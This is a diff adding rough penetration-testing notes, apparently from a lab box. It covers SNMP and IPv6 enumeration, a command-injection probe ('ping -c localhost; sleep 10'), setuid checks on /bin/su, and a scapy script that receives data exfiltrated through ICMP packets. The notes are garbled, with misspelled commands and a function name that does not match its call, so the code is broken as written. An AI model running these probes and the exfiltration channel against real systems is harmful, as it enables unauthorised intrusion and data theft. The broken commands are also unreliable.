@@ -1,0 +1,52 @@
+udp scan
+    nmap -sU -v ip
+
+--161 port --
+snmap -c public -v2c ip 
+onesixtyone  -c dict.txt -i hosts
+find /usr/share/seclists | grep -i snmp
+the onesixtyone has a bug in kali 
+git clone onesixtyone
+-- done --
+
+--analysis snmp -- 
+apt install snmp-mibs-downloader
+
+vi /etc/snmp/snmp.conf
+mibs -> #mibs
+snmpwalk -c public -v2c host | tee snmpwalk.out
+ping6 ipv6%eth33
+grep simpleHTTP  snmpwalk.out
+-- done --
+
+-- nmap for ipv6 -- 
+nmap -6 -sS -sV ipv6
+nc -zv -6 ipv6 
+-- --
+
+-- ping -c localhost; sleep 10 --
+ls -al /bin/su
+-rwsr-xr-x+ 1 root root jan 25 2018 /bin/su
+getacl /bin/su
+
+nc -h 2>&1;echo see the nc output
+
+find / newermt 2018-05-15 ! -newermt 2018-05-19 -type f 2>/dev/null
+
+xxd -p -c 4 exfil
+
+python3 scapy.all
+ls(pkt[0][ICMP])
+
+
+def process_pakcet(pkt):
+    if (pkt.haslayer(ICMP)):
+        if pkt[ICMP].type ==8:
+            data = pkt[ICMP].load[-4:].decode('utf-8');
+
+            print(f'{data}', flush=True, end='')
+
+sniff(iface="tun0", prn=processs_packet);
+
+
+
